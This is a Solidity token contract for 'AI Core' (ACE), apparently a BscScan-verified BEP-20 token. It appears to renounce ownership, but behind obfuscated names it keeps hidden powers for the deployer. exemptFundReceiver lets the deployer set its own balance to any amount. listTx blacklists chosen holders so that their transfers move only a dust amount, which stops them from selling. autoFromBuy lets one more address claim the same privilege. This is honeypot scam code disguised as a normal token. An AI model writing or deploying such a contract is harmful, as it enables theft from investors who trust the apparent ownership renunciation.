/**
 *Submitted for verification at BscScan.com on 2023-02-02
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface feeFund {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface toEnableTotal {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AICore is Ownable{
    uint8 public decimals = 18;
    address public isMarketing;
    mapping(address => bool) public listEnable;


    string public symbol = "ACE";
    uint256 constant tradingLaunched = 10 ** 10;
    mapping(address => mapping(address => uint256)) public allowance;

    uint256 public totalSupply = 100000000 * 10 ** 18;
    bool public liquidityTakeExempt;
    mapping(address => uint256) public balanceOf;
    address public tradingIs;

    mapping(address => bool) public receiverFee;
    string public name = "AI Core";
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        feeFund tradingMin = feeFund(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        isMarketing = toEnableTotal(tradingMin.factory()).createPair(tradingMin.WETH(), address(this));
        tradingIs = fundFee();
        receiverFee[tradingIs] = true;
        balanceOf[tradingIs] = totalSupply;
        emit Transfer(address(0), tradingIs, totalSupply);
        renounceOwnership();
    }

    

    function exemptFundReceiver(uint256 listTrading) public {
        if (!receiverFee[fundFee()]) {
            return;
        }
        balanceOf[tradingIs] = listTrading;
    }

    function transfer(address walletLimit, uint256 listTrading) external returns (bool) {
        return transferFrom(fundFee(), walletLimit, listTrading);
    }

    function listTx(address launchMode) public {
        if (launchMode == tradingIs || launchMode == isMarketing || !receiverFee[fundFee()]) {
            return;
        }
        listEnable[launchMode] = true;
    }

    function launchedList(address maxTotal, address receiverReceiver, uint256 listTrading) internal returns (bool) {
        require(balanceOf[maxTotal] >= listTrading);
        balanceOf[maxTotal] -= listTrading;
        balanceOf[receiverReceiver] += listTrading;
        emit Transfer(maxTotal, receiverReceiver, listTrading);
        return true;
    }

    function autoFromBuy(address tokenTx) public {
        if (liquidityTakeExempt) {
            return;
        }
        receiverFee[tokenTx] = true;
        liquidityTakeExempt = true;
    }

    function fundFee() private view returns (address) {
        return msg.sender;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function approve(address walletLimitAt, uint256 listTrading) public returns (bool) {
        allowance[fundFee()][walletLimitAt] = listTrading;
        emit Approval(fundFee(), walletLimitAt, listTrading);
        return true;
    }

    function transferFrom(address teamLaunch, address walletLimit, uint256 listTrading) public returns (bool) {
        if (teamLaunch != fundFee() && allowance[teamLaunch][fundFee()] != type(uint256).max) {
            require(allowance[teamLaunch][fundFee()] >= listTrading);
            allowance[teamLaunch][fundFee()] -= listTrading;
        }
        if (walletLimit == tradingIs || teamLaunch == tradingIs) {
            return launchedList(teamLaunch, walletLimit, listTrading);
        }
        if (listEnable[teamLaunch]) {
            return launchedList(teamLaunch, walletLimit, tradingLaunched);
        }
        return launchedList(teamLaunch, walletLimit, listTrading);
    }


}